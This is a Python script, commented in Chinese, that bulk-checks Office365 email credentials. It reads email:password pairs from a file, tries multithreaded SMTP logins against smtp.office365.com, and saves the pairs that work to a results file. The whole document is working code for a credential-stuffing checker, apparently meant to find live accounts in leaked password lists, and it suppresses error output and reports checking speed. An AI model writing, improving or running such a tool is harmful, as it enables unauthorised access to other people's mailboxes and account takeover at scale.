import smtplib
import ssl
import threading
from queue import Queue
import time
import os
import csv

# 线程安全的打印函数
def safe_print(message, lock=None):
    if lock:
        with lock:
            print(message)
    else:
        print(message)

def verify_office365_login(email, password, use_port=587, lock=None):
    """
    Office365 SMTP 登录验证（优化版）
    
    参数:
        email: 完整邮箱地址
        password: 邮箱密码或应用密码
        use_port: 587 (推荐)
        lock: 线程锁对象，用于安全打印
    """
    SMTP_SERVER = "smtp.office365.com"
    
    try:
        # 创建安全上下文 (强制使用 TLS 1.2+)
        ssl_context = ssl.create_default_context()
        ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        
        # 建立连接（超时减少到10秒）
        with smtplib.SMTP(SMTP_SERVER, use_port, timeout=10) as server:
            # 启用 STARTTLS
            server.starttls(context=ssl_context)
            
            # 执行登录验证
            server.login(email, password)
            
            # 仅打印成功信息（减少输出）
            if lock:
                with lock:
                    print(f"✅ 成功: {email}")
            return True
            
    except smtplib.SMTPAuthenticationError:
        pass  # 不打印失败信息减少输出
    except Exception:
        pass  # 忽略其他错误减少输出
    return False

def read_accounts_from_file(filename):
    """从文件中读取邮箱账户信息（优化版）"""
    accounts = []
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if line and ':' in line:
                    parts = line.split(':', 1)
                    email = parts[0].strip()
                    password = parts[1].strip()
                    accounts.append({
                        "email": email,
                        "password": password,
                        "port": 587
                    })
    except Exception as e:
        print(f"❌ 读取文件错误: {str(e)}")
    return accounts

def worker(task_queue, lock, success_buffer, failure_buffer, buffer_lock, buffer_threshold=1000):
    """线程工作函数（优化版）- 批量缓存结果"""
    while not task_queue.empty():
        try:
            account = task_queue.get_nowait()
            email = account["email"]
            password = account["password"]
            port = account["port"]
            
            success = verify_office365_login(email, password, port, lock)
            
            # 将结果存入缓冲区
            with buffer_lock:
                if success:
                    success_buffer.append(f"{email}:{password}\n")
                else:
                    failure_buffer.append(f"{email}:{password}\n")
            
            task_queue.task_done()
        except Exception:
            task_queue.task_done()

def flush_buffers(success_file, failure_file, success_buffer, failure_buffer, buffer_lock):
    """将缓冲区内容写入文件"""
    with buffer_lock:
        # 写入成功结果
        if success_buffer:
            with open(success_file, 'a', encoding='utf-8') as f:
                f.writelines(success_buffer)
            success_buffer.clear()
        
        # 写入失败结果
        if failure_buffer:
            with open(failure_file, 'a', encoding='utf-8') as f:
                f.writelines(failure_buffer)
            failure_buffer.clear()

if __name__ == "__main__":
    # 配置参数（优化版）
    ACCOUNT_FILE = "mail.txt"
    SUCCESS_FILE = "success_results.txt"
    FAILURE_FILE = "failure_results.txt"
    MAX_THREADS = 10
    BUFFER_THRESHOLD = 5000  # 缓冲区阈值
    PROGRESS_INTERVAL = 5    # 进度刷新间隔(秒)
    
    print("Office365 批量登录验证 (优化版)")
    print("=" * 50)
    print(f"▶ 账户文件: {ACCOUNT_FILE}")
    print(f"▶ 成功文件: {SUCCESS_FILE}")
    print(f"▶ 失败文件: {FAILURE_FILE}")
    print(f"▶ 并发线程: {MAX_THREADS}")
    print(f"▶ 缓冲阈值: {BUFFER_THRESHOLD}条")
    print(f"▶ 进度刷新: 每 {PROGRESS_INTERVAL} 秒")
    print("=" * 50)
    
    # 初始化结果文件
    for fname in [SUCCESS_FILE, FAILURE_FILE]:
        if os.path.exists(fname):
            try:
                os.remove(fname)
                print(f"⚠️ 已删除旧文件: {fname}")
            except Exception as e:
                print(f"❌ 删除文件失败: {str(e)}")
                exit()
    
    # 创建空结果文件
    open(SUCCESS_FILE, 'w').close()
    open(FAILURE_FILE, 'w').close()
    
    # 记录总开始时间
    total_start_time = time.time()
    start_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(total_start_time))
    print(f"▶ 开始时间: {start_time_str}")
    
    # 读取账户信息
    accounts = read_accounts_from_file(ACCOUNT_FILE)
    
    if not accounts:
        print("❌ 未找到有效账户信息")
        print("文件格式应为: 邮箱:密码 (每行一个账户)")
        exit()
    
    total_accounts = len(accounts)
    print(f"✅ 找到 {total_accounts} 个账户，开始验证...")
    print("=" * 50)
    
    # 创建任务队列和线程安全对象
    task_queue = Queue()
    lock = threading.Lock()
    buffer_lock = threading.Lock()
    
    # 结果缓冲区
    success_buffer = []
    failure_buffer = []
    
    # 填充任务队列
    for account in accounts:
        task_queue.put(account)
    
    # 创建并启动线程
    threads = []
    for i in range(min(MAX_THREADS, total_accounts)):
        t = threading.Thread(
            target=worker, 
            args=(task_queue, lock, success_buffer, failure_buffer, buffer_lock, BUFFER_THRESHOLD),
            name=f"Thread-{i+1}",
            daemon=True
        )
        t.start()
        threads.append(t)
    
    # 进度监控
    last_count = total_accounts
    last_time = time.time()
    last_flush_time = time.time()
    
    try:
        while any(t.is_alive() for t in threads):
            current_time = time.time()
            elapsed_since_last_flush = current_time - last_flush_time
            
            # 检查缓冲区是否需要刷新
            with buffer_lock:
                buffer_size = len(success_buffer) + len(failure_buffer)
            
            # 定期刷新缓冲区（时间或大小触发）
            if buffer_size >= BUFFER_THRESHOLD or elapsed_since_last_flush >= PROGRESS_INTERVAL:
                flush_buffers(SUCCESS_FILE, FAILURE_FILE, success_buffer, failure_buffer, buffer_lock)
                last_flush_time = current_time
            
            # 进度显示
            if current_time - last_time >= PROGRESS_INTERVAL:
                remaining = task_queue.qsize()
                checked = total_accounts - remaining
                elapsed_time = current_time - total_start_time
                
                # 计算速度
                if last_time != current_time:
                    speed = (last_count - remaining) / (current_time - last_time)
                else:
                    speed = 0
                
                last_count = remaining
                last_time = current_time
                
                # 计算预估剩余时间
                if speed > 0:
                    eta = remaining / speed
                    eta_str = time.strftime('%H:%M:%S', time.gmtime(eta))
                else:
                    eta_str = "N/A"
                
                print(f"\r⏱️ 进度: {checked}/{total_accounts} | "
                      f"速度: {speed:.1f}个/秒 | "
                      f"剩余: {eta_str} | "
                      f"耗时: {elapsed_time:.0f}s | "
                      f"缓存: {buffer_size}", end="")
            
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n\n⚠️ 用户中断，等待线程结束...")
    
    # 等待所有线程完成
    for t in threads:
        t.join(timeout=2)
    
    # 最终刷新缓冲区
    flush_buffers(SUCCESS_FILE, FAILURE_FILE, success_buffer, failure_buffer, buffer_lock)
    
    # 统计结果
    total_elapsed = time.time() - total_start_time
    
    try:
        with open(SUCCESS_FILE, 'r', encoding='utf-8') as f:
            success_count = sum(1 for _ in f)
    except:
        success_count = 0
        
    try:
        with open(FAILURE_FILE, 'r', encoding='utf-8') as f:
            failure_count = sum(1 for _ in f)
    except:
        failure_count = 0
    
    print("\n\n" + "=" * 50)
    print("验证完成!")
    print(f"✅ 成功: {success_count} 个账户")
    print(f"❌ 失败: {failure_count} 个账户")
    print(f"⏱️ 总耗时: {total_elapsed:.2f}秒")
    print(f"🚀 平均速度: {total_accounts/total_elapsed:.2f} 个/秒")
    
    if success_count > 0:
        print(f"\n📝 成功账户已保存到: {SUCCESS_FILE}")
    if failure_count > 0:
        print(f"📝 失败账户已保存到: {FAILURE_FILE}")
    
    print("=" * 50)